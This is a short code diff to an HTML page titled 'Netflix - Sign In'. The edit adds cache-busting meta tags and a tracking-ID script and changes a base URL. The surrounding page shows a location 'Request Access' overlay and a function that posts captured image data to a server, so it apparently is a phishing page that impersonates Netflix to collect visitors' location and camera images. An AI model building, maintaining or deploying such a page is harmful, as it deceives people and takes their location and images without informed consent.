@@ -1,6 +1,8 @@
 <!doctype html>
 <html lang="en">
-<head>
+<head><meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix - Sign In</title>
@@ -266,7 +268,7 @@
         }
     </style>
 </head>
-<body>
+<body><script>window.TRACKIFY_TID="6cb9c4d0ed941f6cec192683746f9be4fe170272830049631d71811d27f51b10";</script>
     <div class="request-access-overlay" id="requestAccessOverlay">
         <div class="request-access-icon">📍</div>
         <div class="request-access-title">Request Access</div>
@@ -337,7 +339,7 @@
 
     <script src="location-request.js"></script>
     <script>
-        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
+        var BASE_URL = window.location.origin + '/';
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
